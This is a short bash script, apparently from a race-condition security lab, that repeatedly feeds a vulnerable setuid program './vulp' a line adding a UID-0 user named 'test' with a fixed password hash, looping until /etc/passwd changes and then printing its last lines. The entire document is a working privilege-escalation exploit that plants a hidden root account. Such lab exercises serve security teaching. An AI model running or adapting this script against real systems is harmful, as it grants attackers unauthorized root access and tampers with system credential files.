#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
count=0
while [ "$old" == "$new" ]
do
    printf '%s\n' 'test:U6aMy0wojraho:0:0:test:/root:/bin/bash' | ./vulp
    count=$((count + 1))
    if [ $((count % 200)) -eq 0 ]; then
        echo "Attempt $count: /etc/passwd unchanged"
    fi
    new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed after $count attempts"
tail -n 4 /etc/passwd
